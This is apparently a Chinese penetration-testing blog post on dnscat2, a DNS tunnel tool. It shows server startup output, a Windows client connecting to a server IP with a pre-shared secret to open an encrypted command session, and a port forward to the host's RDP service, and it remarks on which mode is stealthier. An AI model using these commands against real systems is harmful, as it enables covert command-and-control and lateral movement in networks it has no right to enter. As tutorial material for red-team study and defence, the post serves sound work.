---
title: "dnscat2 代理隧道"
date: 2019-07-08T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['port']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

dnscat2 是一款基于 DNS 协议的代理隧道. 不仅支持端口转发, 另外还有执行命令, 文件传输等功能, 不过实测下来都不怎么好用.

其原理与 DNS Log 类似, 分为直连和中继两种模式, 前者直接连接服务端的 53 端口, 速度快, 但隐蔽性差, 后者通过对所设置域名的递归查询进行数据传输, 速度慢, 但隐蔽性好.

关于中继模式中的域名配置, 请参考 cobalt strike 的 `dns_becaon`

服务端由 ruby 编写, 客户端由 C 编写, 另有 powershell 版本.

<!--more-->

```
# ruby dnscat2.rb
New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = n/a]...

It looks like you didn't give me any domains to recognize!
That's cool, though, you can still use direct queries,
although those are less stealthy.

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=33971b1d1593d219ac8ed615d5339180

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> 
```

每次运行都会有不同的 secret key 生成.

```
C:\> dnscat2.exe  --dns server=192.168.1.100,port=53 --secret=33971b1d1593d219ac8ed615d5339180
Creating DNS driver:
 domain = (null)
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 192.168.1.100

** Peer verified with pre-shared secret!

Session established!
```

在 dnscat2 中, 会话被称之为 window, 因为在会话间的切换需要用到 `ctrl-z`.

```
dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains =  [*]
  1 :: command (LAPTOP) [encrypted and verified] [*]
dnscat2> 
```

创建一条端口转发.

```
(the security depends on the strength of your pre-shared secret!)
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (LAPTOP) 1> listen 1234 127.0.0.1:3389
Listening on 0.0.0.0:1234, sending connections to 127.0.0.1:3389
command (LAPTOP) 1> 
```

至于更多用法请参阅 [README.MD](https://github.com/iagox86/dnscat2/blob/v0.07/README.md)